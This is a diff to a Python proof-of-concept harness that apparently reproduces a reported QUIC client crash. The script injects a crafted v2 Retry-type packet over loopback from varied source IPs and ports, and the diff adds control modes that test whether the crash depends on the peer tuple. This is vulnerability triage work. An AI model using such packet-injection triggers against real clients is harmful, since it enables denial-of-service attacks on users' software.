@@ -14,6 +14,8 @@ MODES = {
     "attack-original": (0x80, V2),      # Exact 7-byte trigger from the report.
     "attack-fixedbit": (0xC0, V2),      # Same v2 Retry type, Fixed Bit set.
     "attack-alt-source": (0x80, V2),    # Send from a different loopback IP/UDP port.
+    "control-alt-port": (0x80, V2),     # Same IP, different UDP source port.
+    "control-alt-ip": (0x80, V2),       # Different IP, same UDP source port.
     "control-original": (0x80, V1),     # Original v1 control from the report.
     "control-retry": (0xF0, V1),        # v1 Retry; same early Retry dispatch path.
 }
@@ -71,13 +73,17 @@ def main() -> int:
                         flush=True,
                     )
                     time.sleep(max(args.delay_ms, 0) / 1000.0)
-                    if args.mode == "attack-alt-source":
-                        # Keep forwarding from the expected server endpoint on
-                        # the main socket, but inject from a different source
-                        # IP and UDP port to test whether the client binds the
-                        # connection exclusively to the authenticated peer tuple.
+                    if args.mode in {"attack-alt-source", "control-alt-port", "control-alt-ip"}:
+                        # Inject from a different source endpoint to isolate
+                        # whether the crash requires the established peer IP
+                        # and/or UDP source port.
                         with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as attacker:
-                            attacker.bind(("127.0.0.2", 0))
+                            if args.mode == "attack-alt-source":
+                                attacker.bind(("127.0.0.2", 0))
+                            elif args.mode == "control-alt-port":
+                                attacker.bind(("127.0.0.1", 0))
+                            else:  # control-alt-ip
+                                attacker.bind(("127.0.0.2", args.listen))
                             attack_source = attacker.getsockname()
                             attacker.sendto(packet, client)
                     else:
